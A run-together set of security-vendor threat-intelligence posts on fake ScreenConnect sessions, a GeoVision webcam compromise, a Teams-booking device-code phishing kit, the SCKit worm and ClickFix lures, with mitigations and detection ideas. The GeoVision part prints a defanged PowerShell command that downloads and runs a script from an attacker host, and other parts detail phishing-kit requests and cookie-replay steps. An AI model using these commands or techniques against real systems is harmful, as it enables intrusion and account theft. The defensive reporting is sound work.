Title: Attackers use Crypto Exchange Names to Disguise Unauthorized Sessions on 100+ ScreenConnect Servers
Context: That could create an opportunity to exploit a client-side vulnerability such as CVE-2026-84869, a critical ScreenConnect vulnerability disclosed September 8
Full Text:
Background

On November 12, 2026, an MSP asked us about a handful of unfamiliar machines in their self-hosted ScreenConnect console. Named after various crypto exchanges, the machines had no apparent company or owner and claimed to be online. Nobody at the MSP had installed them.

The MSP's server itself was clean. We found no evidence of web shells, suspicious child processes, or new accounts. The sessions were real entries in the server's database, though, so we turned the question around: If one server had these guests, how many others did?

We collected the ScreenConnect session database (App_Data\Session.db) from the Huntress-protected ScreenConnect servers we could reach and looked for the same pattern. As of this writing, we've found 2,223 fake sessions on 118 servers across 109 MSP and organization accounts.

These unauthorized sessions have been added over the course of the past 10 days. Across our telemetry, we could see the first session was enrolled November 3, and the latest one was enrolled November 13.

Huntress has investigated various incidents involving ScreenConnect in the last few months: including rogue ScreenConnect installations seen in September and, most recently, activity linked to the SCKit worm on November 11. We haven't found any overlap between the crypto-bait fakes and the published SCKit indicators.

Figure 1: An overview of the unauthorized sessions found

What do these unauthorized sessions look like?

ScreenConnect is remote desktop software that many MSPs host on their own servers. Technicians connect to customer computers using a host client, and each customer computer runs a guest client. In an unattended "Access" session, a guest can stay registered in the server's console even when no technician is connected, appearing in the session list of computers available for access.

Figure 2: Example list of unauthorized sessions in ScreenConnect (image courtesy of Reddit).

Someone is registering unauthorized guest computers on MSPs' servers, where they sit in these session lists. In the console, each one looks like an always-online computer with a crypto-exchange name and a thumbnail of what appears to be a trading desktop.

Figure 3: a collection of thumbnails from unauthorized sessions.

The names all combine an exchange or crypto word with a role word, including KUCOIN-SRV, SRV-BINANCE, BACKUP-PROBIT, WORKSTATION-COINEX and DASH-BITMEX. Overall, we counted over 1,000 distinct fake names across the 2,408 unauthorized guest sessions.

To register, a guest client needs a ScreenConnect server's relay address, which is embedded in that server's guest installer. On the first server we investigated, we found the MSP's Access installer was publicly downloadable. An online file-scanning service retrieved it in mid-October, weeks before the unauthorized sessions appeared. ScreenConnect makes these installers available without authentication by design.

Figure 4: Unauthorized guest sessions created per day.

The majority of these sessions connected from a single IP,74.208.158[.]106, which is IONOS SE-hosted. Another early instance was 197.47.160[.]252, an Egyptian residential IP, which created the first three unauthorized sessions on November 3.

Figure 5: VirusTotal results for 74.208.158[.]106

What happens in an unauthorized session?

In our investigations, we found no evidence of any sort of malicious activity coming from these unauthorized sessions. The file or command events related to them came from the technician's side. In a handful of cases, a technician opened the unauthorized session; most of these connections lasted less than 30 seconds.

In one case, a technician stayed longer and used ScreenConnect's "send text" feature twice to type in the remote session, sending keystrokes to the guest. Because ScreenConnect does not retain sent text, we treated this as a possible credential exposure and contacted the MSP. In another case, a technician queued a delete command to remove the unauthorized sessions. The command was delivered, but it never returned any output.

The unauthorized sessions appeared to be actively maintained. Across 29 servers with complete connection histories, we observed a repeating sequence of events: the operator revisited the servers every 151 seconds, creating or reconnecting fake sessions along the way.

Individual connections typically lasted about 64 minutes, and sessions that reconnected did so about every 55 minutes. That repeated connection activity kept the unauthorized sessions appearing online in the console, where they could pass for real computers.

The attacker's possible goals

Why enroll thousands of guest machines that never do anything? One possibility is that the crypto-themed sessions are bait, waiting for a technician to connect. That could create an opportunity to exploit a client-side vulnerability such as CVE-2026-84869, a critical ScreenConnect vulnerability disclosed September 8.

For this flaw, in both Support and Access sessions, a malicious guest could trigger file-transfer actions that an unpatched technician's workstation would accept and run without asking, including with elevated rights. A file could then run on the technician's workstation—often the MSP's most privileged machine.

This is our leading hypothesis, but it's important to note that we have not observed the guest sessions being used this way. We have not seen a crypto-named system push or run a file. We also can't rule out other goals, such as capturing what a technician types into the session.

Public discussion of this activity has also suggested that the fakes come from Joe Sandbox, a malware-analysis service, detonating ScreenConnect installers, which could be dismissed as harmless noise. However, after further investigation, this doesn't seem likely.

While an installer run in a sandbox sends a key and JPEG screenshots of the analysis VM, these guest sessions send no key, reuse seven screenshot families, and randomize hardware and OS details. This aligns with the characteristics of an emulator. Furthermore, the timeline of the guest session campaign shows intent: they revisited 100-plus servers in the same order daily for 10 days and kept sessions online for a week, which does not match what we would expect from a sandbox. We found no confirmation that any of these addresses belong to Joe Security. Public reports show 74.208.158[.]106 as a contacted host that sits in IONOS hosting space, not sandbox egress.

What Should MSPs Do?

MSPs should upgrade ScreenConnect host clients to 26.6.5 or later, along with affected Access agents. If upgrades must wait, they should check ConnectWise's advisory about removing TransferFiles permission from roles and session groups. Server history can identify client versions.

As another precaution, organizations should bar technicians from joining sessions they cannot tie to a customer. Crypto-exchange names, blank company fields, or a mismatched client version should trigger a pause and investigation.

In Access, teams should look for exchange-and-role names, empty company/site fields, guest version 25.3.4.9288, and crypto-site previews. Before deleting fakes, they should preserve App_Data\Session.db and its WAL file.

Session history or a database copy can show whether a technician joined and whether files, commands, or text moved. Reviews should distinguish technician-side from guest-side activity: a fake alone only shows reachability, not exposure. Guest-side file events during a technician connection may indicate CVE-2026-84869 activity. If an unpatched client has joined, the organization should inspect its workstation's ScreenConnect Temp and Startup folders, plus process history.

To limit enrollment, organizations should restrict installer and web access where supported, keep Access installer links private, rebuild leaked installers, and place unfamiliar sessions in a group technicians don't routinely browse. Blocking known, bad IPs can help, but operators may move.

Furthermore, here are some detection opportunities:

Server database: New guest sessions with ClientType 1 (Windows) and an empty guest public key; guest version 25.3.4.9288.

Server logs / SIEM: Many new Access guests from one external IP across a short window, especially 74.208.158[.]106.

Technician workstations: ScreenConnect.WindowsClient.exe starting cmd.exe, powershell.exe, wscript.exe or msiexec.exe with a file under Documents\*\Temp\. That's the host-side shape of CVE-2026-84869 exploitation.

Acknowledgements: Special thanks to Zach Rogers, Cristian Poenaru, Harry Godridge, and Tanner Filip for their contributions to the analysis and triage associated with this investigation and this writeup.

Background

The Huntress SOC observed widespread malicious activity stemming from GeoVision webcam software this week, with the bulk of the attacks occurring between November 8 and November 10. GeoVision is a Taiwanese surveillance and access-control company.

We have seen malicious activity across ten accounts and 13 organizations (all across various industries). All malicious activity stemmed from GeoStartupAgentService.exe; across many endpoints, the activity was run under the NT AUTHORITY\SYSTEM account. A search on Shodan for impacted endpoints' external IPs indicated publicly exposed GeoVision devices or management interfaces.

Figure 1: Suspicious command stemming from GeoStartupAgentService.exe

The detected activity originating from this parent process exhibited a similar attack chain and dropped files across most endpoints. Figure 2 breaks down the attack chain we observed.

Figure 2: The attack chain observed by the SOC across multiple organizations

What we saw

On various endpoints where this software was publicly exposed, we first saw the GeoVision service spawn a command shell:

cmd.exe /c powershell -c iex (new-object net.webclient).downloadstring('hxxp://45[.]32[.]117[[.]]34/a')

The command then led to the launch of various PowerShell scripts both in memory and downloaded to disk (a, b, and c ) from 45.32.117[.]34. The PS1 extension will be added to these to help with readability.

We observed a.ps1 being detonated in memory before searching for writable directories and checking if Microsoft Defender is active on the victim's environment. The secondary script (b.ps1) was written to disk before being detonated using WMI. This script also performed the same writable folder probe as the previous script before downloading kvckiller.sys. Closer inspection via VirusTotal reveals this to be a Windows kernel-mode driver (wsftprm.sys) that's previously been abused in Bring Your Own Vulnerable Driver (BYOVD) attacks as a way for threat actors to tamper with antivirus protections like Microsoft Defender.

Figure 3: VirusTotal search for wsftprm.sys, which has been seen in the wild as kvckiller.sys

At this stage of the attack, we also observed attackers configuring three IFEO Debugger hijacks, which abuse a Windows troubleshooting feature. Image File Execution Options (IFEO) lets administrators configure a "debugger" to start when a particular executable is launched. The setting is stored in the Windows Registry under a key named for that executable.

This particular attack targeted Windows Defender components MsMpEng.exe (the Microsoft Defender Antivirus engine), SecurityHealthService.exe (the Windows Security service), and SecurityHealthSystray.exe (the Windows Security notification-area app).

When Windows or another component tries to start one of those executables, the IFEO setting redirected the launch to systray.exe instead. This is a likely attempt to interfere with the launch of those components, as redirecting the launch to systray.exe can keep the intended security process from starting, depending on how the replacement is configured.

Finally, c.ps1 was detonated in memory. This script's main purpose was to download and execute update.exe in the current directory, which was a custom Golang loader (reaching out to 156.246.94[.]183). At the time of the investigation, this IP was associated with the domain cctv-update[.]top, which was registered on November 7 at 02:40 UTC. This binary includes a BitTorrent Mainline DHT client and a PKARR resolver (Public-Key Addressable Resource Records). Together, they let it use a public key to find the server's current addresses on the DHT, allowing the operator to move infrastructure without registering a domain or losing access to it.

On some endpoints, we also saw update.exe set up a scheduled task (PackageUpdater), which was configured to execute C:\WINDOWS\system32\config\systemprofile\update.exe every 15 minutes, which restarts update.exe if it stops. On some endpoints, we also saw the scheduled task PackageUpdater_Startup running at system startup with SYSTEM privileges.

Finally, we observed this loader downloading XMRig (ApplyUpdate.exe), the open-source cryptominer that's been popular with threat actors in various attacks.

Mitigation guidance

This attack is a reminder that internet-exposed software can give attackers a foothold inside an organization. Organizations should remove unnecessary public access to GeoVision devices and management interfaces, placing them behind a VPN or restricting access to trusted IP addresses.

Organizations running GeoVision should also look for signs of compromise, including unexpected command shells or PowerShell launched by GeoStartupAgentService.exe, and review the indicators listed in this advisory. If malicious activity is found, defenders should isolate impacted hosts and preserve evidence before removing files or changing configurations.

Additionally, based on our static analysis of update.exe, we have identified several more detection opportunities for organizations:

DNS queries to 8.8.8[.]8, 8.8.4[.]4, or 1.1.1[.]1 initiated by a process other than the system DNS client

Outbound UDP DHT traffic on port 6881 or similar from a GeoVision server/process WebCamServer.exe

schtasks /Create commands launched by update.exe

Finally, the Huntress SOC has seen several previous incidents involving attackers targeting camera systems in order to carry out malicious activity. Organizations should treat camera management applications and software as part of the enterprise attack surface.

Title: Crafty Microsoft Teams Booking Flow Disguises Device Code Phishing

Full Text:
Acknowledgments: Special thanks to Andrew Brandt for contributions to this investigation and writeup.

Background

Over the past year, Huntress has tracked several significant device code phishing campaigns, including the widespread Railway-based Microsoft 365 token replay campaign we reported in March.

In mid-October, the Huntress SOC observed an attack that was unique in the lengths it went to disguise this device code flow. Threat actors interlaced the components of the device code authorization process into what appeared to be a Microsoft Teams meeting-booking process.

The attack began with a spear-phishing email impersonating a senior vice president at a real company. A link in the email led the target through several redirects to the phishing site. Rather than immediately presenting the victim with a Microsoft sign-in page, as conventional credential-phishing pages often do, the site used a plausible "Microsoft Teams Meeting Scheduler" workflow to establish more context for the attack. As the victim clicked through the site, behind the scenes it initiated a Microsoft device-code sign-in request and generated a user code; and when the target clicked "Confirm Meeting," the site quietly copied that code to the clipboard. The next step directed the target to Microsoft's legitimate device-login page, where entering the code would authorize the attacker's session.

While the Huntress SOC quickly contained this attack, it shows how threat actors are adapting device code phishing into more convincing social-engineering ploys that disguise the authorization process as an everyday task. We are releasing details below to show how attackers may go beyond a generic verification-code prompt for device code phishing, and instead turn to realistic meeting-booking flows or other lures to make the device code process feel legitimate and lower a victim's guard.

Figure 1: An overview of the attack flow

An Overview of Device Code Phishing

Before we delve into the attack, let's go over a quick primer on how attackers abuse the device code authorization flow. Device code phishing can be difficult for victims to pick up on because it involves the legitimate authorization flow and login domain: an attacker initiates a device-code sign-in request, then convinces a target to enter the resulting code on Microsoft's real device-login page (microsoft.com/devicelogin).

From the victim's perspective, the process can appear routine: they enter the code, complete multifactor authentication (MFA) if prompted, and approve the request. In doing so, however, they authorize the attacker's session and allow the attacker to obtain valuable access tokens.

Many of the device code phishing attacks we have observed (particularly with the attacks abusing Railway) use a variation of the same lure: sending targets a PDF (whether it's an "Agreement Review" or something else) and asking them to copy a "verification code" and enter it into the legitimate Microsoft device login URL in order to access that PDF.

Figure 2: Previous types of device code phishing lures the Huntress SOC has seen

Attacker tradecraft

Initial lure

In mid-October, an employee at a company in the construction industry received a spear-phishing email. The message came from an email account that used a typosquatted domain to impersonate another company in the construction sector. The email purported to come from the actual senior vice president of that company.

Because the impersonated employee and company are legitimate, we have redacted the names of both in this blog; we have also reached out to the company to notify them of the fake domain.

The email contained a link that was wrapped by Microsoft safe links (nam12.safelinks.protection.outlook[.]com) and pointed to a Google short link (share[.]google/?q=UltJkMsVWI5V 9GJM1). This then redirected to www.google[.]com/share[.]google?q=UltJkMsVWI5V9GJM1 before the target was taken to an initial lure page at the typosquatted domain (see Figure 3).

These three redirects happened server-side at the same instant; because the email body contained the share.google link, as opposed to the typosquatted domain, it sidestepped URL reputation checks for email security.

Figure 3: The initial lure link

Lure domain

A closer inspection of the lure domain itself showed it has been set up with Zoho Mail (as indicated via its SPF record and Zoho verification TXT records). The domain shows a Microsoft Teams calendar meeting setup, including a headshot of the senior vice president, along with their name and the fake email address.

The left panel of the lure page pitches an "Introductory call" with the senior vice president about "a long-term partnership for the supply of your products." Targets are then prompted to click the date, time, and duration of their call.

The device code phishing

A closer look at the decrypted phishing kit linked to this lure page shows that when the victim fills out the duration, time, date, and name on the page, this information is not sent anywhere. The page makes no network calls until after the "Continue" button in Figure 3 is clicked.

At this point, the page resolves the visitor's country, using the site's own /cdn-cgi/trace, the backend's /api/visitor/country, or a cloudflare[.]com/cdn-cgi/trace fallback, and sends it to the backend in a request that carries no body:

POST hxxps[:]//gpimmlgration[.]com/static-export/api/device/start X-Antibot-Token: REDACTED | X-Auth-Mode: cookie | X-WinHello: 1 X-Automatic-Target-Country: 1 | X-Visitor-Country: XX | Idempotency-Key: web-<uuid>

On the backend (not visible to the user), the attack chain here starts a Microsoft device code sign-in and returns a user_code, which is the device code.

On the victim's end, after clicking "Continue" they are taken to the "Confirm" page (seen in Figure 4), which shows a message to "Confirm Your Booking" and includes a "Booking Reference." This booking reference is the device code.

Figure 4: Lure confirmation page ("Booking Reference" is the device code)

The target is told to copy the fake booking reference before clicking a "Confirm Booking" button. The page includes a session expiration countdown to put added pressure on the victim.

When the victim clicks "Copy" or "Confirm Meeting" the code is copied to the clipboard, and the attack chain opens a popup to show Microsoft's real device sign-in page. At this point, the target is prompted to enter their code, which approves the threat actor's pending device sign-in and rounds out the device code phishing attack.

Finally, when the backend reports success, the page closes the Microsoft popup, showing the victim a "Verification complete" note and redirecting the top window to hxxps[:]//calendly[.]com/[REDACTED]/30min. This redirects the victim to what looks like a real booking page, so that they don't have any reason to think anything suspicious happened.

After the victim in the attack Huntress observed went through these steps and the attacker obtained the session token, it kicked off the Cmsi:Cmsi login to Microsoft Authentication Broker, indicating successful device code authentication. At this point, Huntress quickly identified and contained the incident, barring the attack from escalating.

The attacker's infrastructure: phishing kit

Further investigation into the attacker's infrastructure revealed that it had fallbacks built into it to keep the victim moving through the flow.

The phishing domain observed in this campaign (at the Teams booking site) showed it was a small loader, with the real phishing kit stored as AES-256-GCM ciphertext (the key and IV were sitting right next to it in the page). The browser decrypts it with a built-in WebCrypto API and writes the result over to the page. The kit then installs its configuration (a window.open hook, and two fetch hooks). Those hooks route the kit's API calls to the backend (hxxps[:]//gpimmlgration[.]com/static-export). To an email scanner or crawler that doesn't run JavaScript, the lure page is just an encrypted blob.

The decrypted kit configuration showed that it included two modes aimed at convincing the target to keep engaging with the attack:

WinHello stage: If the backend provides a mirror_url, the victim sees a pop-up designed to look like a real Microsoft window. It says: "Your sign-in was successful. To continue, we need to complete an additional verification on this device." While we can't see where mirror_url points, we can see the subsequent pop-up directs the target to take further action.

Token-mode fallback: If Microsoft returns AADSTS50076 or interaction_required, which can happen when MFA is required, the victim sees this message: "For your security, please verify your account again. A new verification code is being prepared." Behind the scenes, the attack starts a new device-code session by sending POST /api/device/start. It restarts the MFA flow and gives the victim another chance to authenticate. The victim then sees: "Verification code ready. Please complete verification using the new code shown on this page."

We also observed the Device code (Cmsi:Cmsi) login being routed through a residential callback proxy so that it looked like regular consumer traﬃc. Compromised consumer electronics sometimes can be abused by threat actors to turn them into what we typically refer to as "residential proxies" - a compromised consumer electronic device, like a cable router or set top box that serves the criminal underground as a way to route traffic through themselves, so the machines at either end of the connection think the traffic originates from the proxy, rather than the machine that is sending data through or receiving data from the proxy. The address in our logs points to a random home internet address that has no other malicious activity associated with it aside from being abused as a proxy, based in New Orleans.

Device code phishing disguises

Device code phishing works well for threat actors because it abuses a legitimate Microsoft authentication process. In this case, the attacker wrapped that process in a credible meeting-booking experience, used an impersonated executive and a typosquatted domain to establish trust, and wove Microsoft's real device-login page into the attack to complete the authorization.

Defenders should treat unexpected device-code prompts as suspicious, especially when they follow a link, booking request, or unexpected interaction. Part of this may include training users to stop and verify the request through known contacts before entering any code on a Microsoft sign-in page. Restrict or monitor device-code authentication where it is not required via conditional access, enable additional complex conditional access policies, enforce phishing-resistant MFA, and investigate unfamiliar OAuth and device sign-ins, especially from unmanaged devices, new regions, or residential proxy infrastructure. The most effective response combines user awareness with identity-focused detection and controls. When a routine task asks someone to copy, enter, or approve a code, defenders should ensure they understand exactly whose session they are authorizing. Following a confirmed compromise check for any rogue MFA methods, unrecognized registered devices, unauthorized app consents, suspicious mailbox rules, and suspicious outbound mail.

Title: SCKit Worm Installs Rogue ScreenConnect Clients and Session Cookie Relays Across Hundreds of Endpoints
Context: ConnectWise later released a security update to address a critical file-transfer vulnerability (CVE-2026-84869) that ranked 9
Full Text:
Acknowledgments: Special thanks to Tanner Filip, Tyler Marzen, Austin Worline, Ethan Williams, Sharon Martin, Ben Bernstein, Andrew Brandt, Jamie Levy, Max Rogers, and Aaron Deal for their contributions to this investigation and writeup.

Update: 11/11/26 @ 11:34pm ET

Huntress has learned that the activity seems to be related to one of the specific extensions that had already been disabled by ConnectWise, RMM+. ConnectWise has disabled this extension (and several other related plugins) on all hosted environments, and urged on-premises partners to do the same in their public advisory.

RMM+ is a third-party extension for ScreenConnect that lets another tool manage ScreenConnect sessions without a technician working through the console. Our analysis suggests that most RMM+ installations we encountered were legitimate, usually added for a project and left in place. But versions 1.0.31 and 1.0.32 contained a serious authentication flaw: if an administrator had never configured the extension's access key, RMM+ would accept a blank one.

RMM+ bypasses ScreenConnect's user accounts, roles, and MFA, and authenticates requests with a shared access key stored in the extension's settings. In versions 1.0.31 and 1.0.32, that key defaulted to blank, meaning the authentication check didn't reject an empty value and a caller could pass the check when no key had been configured.

The important part is the access key setting:

<Setting Name="RMMPlus.AccessKey" IsServerOnly="true">

<Description>This is like a password. This is required to be sent in the POST request to access the functions. Set to a strong key..</Description>

<DefaultValue></DefaultValue>

</Setting>

The description tells the admin to set a strong key, but if empty, will introduce the vulnerability.

This matched our observations in this incident. Commands reached endpoints across several ScreenConnect instances within minutes. There was no corresponding login activity and the commands appeared in the logs reviewed linked to RMM+.

A special thanks to Mendy Green for helping us validate these findings.

ORIGINAL POST

Background

On November 11, 2026, Huntress observed an operator using access to multiple cloud-hosted ScreenConnect panels to push commands to groups of managed endpoints. The commands installed attacker-controlled ScreenConnect clients and an additional toolkit called SCKit. At least 288 hosts across 48 organizations that use Huntress have been affected.

In an advisory posted at 22:45 UTC on November 11, ConnectWise shared that they had identified five independent third-party extensions that may be associated with this activity; they said that they had not yet identified an initial access vector and full scope of the attack. They disabled the following extensions across 400 partner environments as a precaution:

Labtech Plus

RMM Plus

RMM+

RMM Plus Password Link

RMM+ Password Link

In September 2026, Huntress stood up a Rapid Response to similar worm-like activity that spawned rogue ScreenConnect clients across several customer environments. ConnectWise later released a security update to address a critical file-transfer vulnerability (CVE-2026-84869) that ranked 9.9 on the CVSS scale.

In analyzing this threat, we have reviewed the activity on two fronts. First, we examined what was observed in the incidents we've seen, where threat actors have used the ScreenConnect panel's Run command feature to deploy SCKit to multiple endpoints.

Then, we analyzed the kit's code to understand how it was built to spread from an infected endpoint to a technician's workstation, and then to other endpoints accessible through the technician's ScreenConnect session. We have not observed that method to spread work successfully. The console-takeover attempt failed in every recovered host log we have checked so far.

Huntress is continuing to respond to and track this November 11 incident; we are releasing further information below about the attacker's tradecraft, a breakdown of SCKit, and Indicators of Compromise (IoCs) in an effort to help defenders responding to this attack.

Technical Details

At approximately 17:47 UTC on November 11, 2026, Huntress observed suspicious activity on endpoints associated with multiple ScreenConnect environments. In total, we saw all 288 hosts impacted over the course of 90 minutes; with about one third of those in the first 10 minutes.

The infection path works in two stages: from an infected endpoint to a technician who connects to it, and from a technician's workstation to every endpoint their panel can connect to. However, not all functionality has been observed during observed incidents; some functionality has been discovered through analysing the payloads.

Figure 1: Timeline of attack across multiple organizations

SCKit in detail

SCKit is the name of the toolkit used to carry this attack forward. This toolkit is a package of 16 files - PowerShell scripts, batch scripts, Windows command-line .cmd files and other configuration data - designed to spread the infection laterally, through a multi-stage process.

Figure 2: The content of the decrypted SCKit archive

The kit is delivered as an encrypted payload, but the infected machine provides the actual decryption key to extract the files from the SCKit package; when the worm sends the request to retrieve the kit from its infrastructure, it passes the UUID of the Windows system it is running on as a part of the URL's query string. The server returns header data that include an encryption key, initialization vector, and a salt value, which the script uses to decrypt the package into the target's %temp% folder.

Figure 3: GET request and server response

As seen in figure 3 above, the query string to retrieve the SCKit payload passes along the GUID for the Windows machine it is running on (top highlighted text). The server returns decryption values the script will use to unpack the payload into the %temp% folder on the same machine.

Observed activity

We initially observed the toolkit's deployment coming through ScreenConnect panels, as opposed to the toolkit's self-replicating behavior. It appears as though an operator used the consoles' Run command feature to send commands to multiple endpoints in one go, running as SYSTEM.

Figure 4: Overview of the attack chain

The command first checked for an existing ScreenConnect client, then downloaded an attacker-controlled ScreenConnect installer to C:\Windows\TEMP\sc.msi and installed it silently. It then wrote a base64-encoded dropper to C:\Windows\Temp\sckit-run.bat.

The dropper then connects to attacker controlled infrastructure and downloads C:\Windows\Temp\sckit-decoder.ps1, and then fetches a keyed version of the SCKit toolkit for the specific system. Several of the components in the toolkit carry out further activity:

Panel-Lateral.ps1 attempts the console takeover (unsuccessfully)

sckit-loader.ps1 decrypts and launches the machine specific script k<32 Hex>.ps1

k[32 Hex].ps1 then extracts the toolkit to C:\ProgramData\RelayTrap

lab-trap-cleanup-embedded.ps1 cleans up the installation in the Temp folder

Figure 5: Install sequence on an endpoint

The trap, along with lockout policies, are then installed by C:\ProgramData\RelayTrap\install.ps1 while CWInstall_<8 hex>-c1\

Installer.ps1 adds exclusions to Defender and installs a second attacker-controlled ScreenConnect client.

Finally, TrapWatch.ps1 is launched as SYSTEM, and compiles RelayTrap.cs into a host-specific copy of C:\ProgramData\RelayTrap\trapbins\<client id>\RelayTrap.exe and creates a scheduled task named TrapWatch. The legitimate installation of ScreenConnect is then stopped, set to manual start, and the attacker controlled copy of ScreenConnect positioned to replace it.

Figure 6: The C# source code of the RelayTrap executable appears to have been generated by an LLM, based on the detailed source code references and comments that explain exactly what it is intended to do

Further functionality in the code

Going beyond what we've observed, we've reconstructed an additional functionality intended to spread from a technician's workstation to the ScreenConnect panel. This has been discovered from analysis of its scripts, configuration, and tools. To date we have not observed a successful jump from an infected endpoint to a technician workstation, or from that workstation to other endpoints.

Figure 7: Additional functionality, designed to spread from technician's workstations.

It appears as though this was designed to wait for when a technician connects to the relay and on to the compromised endpoint. A file transfer takes place 2.5 seconds after the connection is established, and retrieves a copy of the Run-Lateral-Full.bat dropper from the compromised endpoint with the action set to Run.

This dropper is built to connect to hxxps://ns.mo7sen[.]dev/EadF.php and download a loader onto the compromised workstation. The loader gathers the workstation's unique ID, sends it back to the attacker's infrastructure, which returns a unique, encrypted kit for that specific workstation.

Panel-Lateral.ps1, with support from LabConfig.ps1, then steals the .aspxauth session cookie from the workstation and attempts to replay the cookie against the panel and obtain the tokens needed to enumerate any other sessions the technician can access.

Next, ToolboxRelayUploader.exe is engineered to use access gained to any other sessions to upload a payload, WithUninstall.ps1, to the panel's Shared Toolbox. A panel request tells every reachable session to run the toolbox item. This payload is designed to run as SYSTEM on those endpoints, installing the trap and extending the cycle. Roughly 60 seconds after the broadcast, ToolboxRelayUploader.exe deletes the Shared Toolbox item.

Mitigation Guidance

If you use ScreenConnect, review your environment now, even if you have not received an alert. Look for unexpected mass activity in ScreenConnect Run Command and Toolbox history, including commands or tools you did not initiate, and check for an unauthorized second ScreenConnect client on managed endpoints.

If you suspect a host is affected:

Do not connect to it through ScreenConnect. An interactive session can trigger the malware to spread to the technician's workstation and then to other ScreenConnect panels available to that technician. Use EDR live response, WinRM, or another out-of-band CLI tool. If a technician has already connected to a suspected host, treat that workstation as potentially exposed and investigate it from a clean device.

Isolate the host and keep it isolated until cleanup is complete. Isolation alone does not remove the persistence, and affected systems have been observed reinfecting shortly after isolation was lifted.

Remove the unauthorized ScreenConnect client and persistence mechanism. Look for and remove the rogue client service, the TrapWatch scheduled task, C:\ProgramData\RelayTrap\, and the toolkit files under %TEMP% (including sckit-*, Panel-Lateral.ps1, runnew.cmd, ToolboxRelayUploader.exe, and sqlite3.exe). Check for and remove the RelayTrapLiteAlert value under HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run. Verify the legitimate ScreenConnect client separately before removing anything.

Revoke access that may have been exposed. From a clean device, terminate active ScreenConnect web sessions and rotate affected ScreenConnect credentials. Because the toolkit can steal browser session tokens, revoke potentially exposed browser and identity-provider sessions as well.

Review and investigate panel activity. Audit ScreenConnect Run Command and Toolbox history for unrecognized executions, and use the instance audit logs to investigate panel access and determine which systems and technician workstations may be affected.

Use SIEM to hunt. If you use Huntress SIEM, ensure ScreenConnect is connected as a data source to help Huntress hunt for suspicious administrator activity across your environment at scale.

Do not return a host to service until the rogue client and its persistence mechanism have been removed, and the system has been checked for reinfection. Continue monitoring ScreenConnect panels and endpoints for suspicious activity.

Title: Beyond the clipboard: The evolving tradecraft of ClickFix
Context: The pages are often hosted on attacker-controlled infrastructure, but we have also seen threat actors leverage cloud-based services to circumvent detection
Full Text:
Acknowledgments: Special thanks to Nick Roddy and Lindsey Welch for their contributions to this investigation and writeup.

Background

Threat actors love ClickFix, a tactic most commonly known for tricking users into executing commands that download malicious scripts, loaders, or infostealers. Although this social engineering trick has been around for a while, threat actors continue to find new ways to utilize it. Just since early August, we've published blogs about the following:

A ClickFix campaign that mimics Amazon and calls the finger utility

Custom GPTs funneling targets to ClickFix lures

A ClickFix-style prompt to "decrypt" a Google Doc

A macOS-focused campaign using a ClickFix lure to determine what payload to deliver

This is just a taste of the ClickFix tradecraft we've seen in recent months. For instance, we've recently been seeing it used as an initial access step leading to lateral movement. We've also seen it use browser-cache-seeded delivery chains, deliver remote access trojans (RAT) that utilize node.js, and even reconstruct executable payloads from data hidden in image files. Not only that, but we continue to track interesting trends in the way ClickFix has been initially delivered.

This isn't the first time we've taken a broader look at ClickFix tradecraft, and it probably won't be the last. Consider this a snapshot of what we're currently seeing "beyond the clipboard," so to speak.

Delivery through malvertising

Several recent ClickFix campaigns leverage malvertising, attempting to lure their targets to malicious landing pages. This may not be new, but it is nevertheless important to stay vigilant. The pages are often hosted on attacker-controlled infrastructure, but we have also seen threat actors leverage cloud-based services to circumvent detection.

Typosquatting

One recent incident started when a user performed a Bing search for "Westlaw," a popular legal research service for lawyers, and clicked on a paid ad in the results. While the page is no longer active, logs show that the link redirected to a typosquatted domain https://vvestalw.ghost[.]io and a page titled "Westlaw - Legal Research Platforms | Thomson Reuters." After a couple of redirects (included in the IOCs section below) the user was brought to a fake site at https[:]//westlaw-signon[.]com, designed to look like the real site on the Thomson Reuters domain, and presented a standard ClickFix workflow.

SEO poisoning

Another campaign that we have seen attempts to trick users searching for LinkedIn, or alternatively real estate, to visit the threat actor's site instead.

Figure 1: Sponsored search ad leading to a spoofed LinkedIn site.

Upon visiting the site, the user is presented with what looks like a Cloudflare "Verify that you are human" turnstile. Checking the checkbox initiates the ClickFix process.

Figure 2: Fake "Verify that you are human" turnstile.

Compromised websites

In other campaigns the initial presentation is even more polished, as is the case with this example of a dental practice website that was temporarily compromised with ClickFix, discovered by Huntress security researcher John Hammond.

Figure 3: Compromised dental site with Manage Consent controls that launches a fake verification.

The page included your typical Manage Consent pop-up, which was actually used as part of the lure. If the user clicked Accept—or clicked anywhere for that matter—they were presented with a fake Cloudflare "Verify that you are human" turnstile.

Figure 4: Another example of a fake "Verify you are human" turnstile.

PowerShell-based fake verifications

If a user checks the box in any of these fake "verify that you are human" turnstiles, ClickFix instructions are presented, similar to the following.

Figure 5: ClickFix instructions.

A PowerShell command is put into the clipboard at this point, containing malicious instructions. However, we've recently noticed attackers including some form of output that the user will see that makes it appear as though a verification process is taking place. These fake verification messages likely reassure the target that the command they just pasted is doing what the page promised, drawing further attention away from the malicious activity by presenting what appears to be part of a legitimate security check.

For example, some ClickFix campaigns open a terminal and display messages, with colored text, that make it appear as though a verification process is underway. However, what's actually happening is the payload is being downloaded and executed.

Figure 6: Examples of fake verification messages displayed in the terminal.

Some PowerShell even includes alternate messages. For instance, if a check for the presence of the payload at the end of the command fails, it displays an error. This may be designed to convince the user to try downloading it again, if for whatever reason the command didn't work.

Figure 7: PowerShell command showing the message displayed if the download check fails.

A message in a terminal is one thing, but some ClickFix commands go far further. In the case of the compromised dental site above, the copied PowerShell included an elaborate script to create a window that presented a detailed series of "checks," along with animated progress bars that turned green when complete.

Figure 8: Fake Cloudflare Security Challenge built entirely from pasted PowerShell ClickFix command.

Payloads

ClickFix is still most often associated with a simple outcome: a user executes a command that downloads a script, loader, or infostealer. But recent incidents have shown that the technique can lead to much more varied payloads.

That variety shows up in two areas—what ClickFix delivers and what attackers do with the foothold it creates. The technique can deliver different types of malware, help attackers establish persistence and expand access across an environment, or serve as the first stage in a more complex delivery chain.

Not an RMM? RATs

While ClickFix attacks often deliver infostealers and loaders, Huntress has occasionally observed remote access trojans (RATs) delivered as the final payload. For instance, one of the campaigns mentioned above abused ChatGPT's Custom GPT feature to trick users into downloading a Windows MSI installer that drops a custom RAT.

In another ClickFix campaign that relied on an MSI installer, the final payload masqueraded as a remote monitoring and management (RMM) tool dubbed DuskDesk—a possible nod to RustDesk, an open source RMM. However, DuskDesk is actually a Node.js-based RAT.

In two incidents investigated by Huntress, an MSI package from apirequestaccess[.]com installed a Node.js wrapper into the user's AppData directory to launch malicious JavaScript (LimeMint.js).

